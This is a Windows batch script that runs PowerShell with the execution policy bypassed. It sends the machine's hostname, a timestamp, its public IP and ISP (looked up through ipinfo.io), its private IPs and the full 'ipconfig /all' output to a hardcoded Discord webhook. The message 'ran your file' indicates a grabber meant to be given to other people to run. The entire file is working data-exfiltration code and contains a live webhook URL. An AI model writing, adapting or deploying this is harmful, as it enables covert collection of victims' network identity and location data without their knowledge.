@echo off
cls
echo Sending info to webhook...

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$webhookUrl = 'https://discord.com/api/webhooks/1391916576265208049/7rDuxlwAFE0tBUKx5ghLEp4-1ubGj3od6_jzIiusJkrOr9dsIzRT1nrc_bCDy_xvdcJH';" ^
  "$hostname = $env:COMPUTERNAME;" ^
  "$timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss';" ^
  "$initMsg = \"**$hostname** ran your file at **$timestamp**\";" ^
  "$payload = @{ content = $initMsg } | ConvertTo-Json -Depth 10;" ^
  "Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json';" ^

  "try { $ipInfo = Invoke-RestMethod -Uri 'https://ipinfo.io/json'; $publicIP = $ipInfo.ip; $isp = $ipInfo.org } catch { $publicIP = 'Unknown'; $isp = 'Unknown' };" ^
  "$privateIPs = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*' } | Select-Object -ExpandProperty IPAddress) -join ', ';" ^
  "$highlight = \"**Public IP:** $publicIP`n**Private IP(s):** $privateIPs`n**ISP:** $isp\";" ^
  "$payload = @{ content = $highlight } | ConvertTo-Json -Depth 10;" ^
  "Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json';" ^

  "Start-Sleep -Seconds 1;" ^
  "$ipconfigOutput = ipconfig /all | Out-String;" ^
  "$maxLength = 1900;" ^
  "$chunks = @();" ^
  "for ($i = 0; $i -lt $ipconfigOutput.Length; $i += $maxLength) {" ^
  "  $length = [Math]::Min($maxLength, $ipconfigOutput.Length - $i);" ^
  "  $chunks += $ipconfigOutput.Substring($i, $length);" ^
  "}" ^
  "foreach ($chunk in $chunks) {" ^
  "  $msg = '```' + $chunk + '```';" ^
  "  $payload = @{ content = $msg } | ConvertTo-Json -Depth 10;" ^
  "  Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json';" ^
  "  Start-Sleep -Milliseconds 500;" ^
  "}"

echo Done sending info.
pause
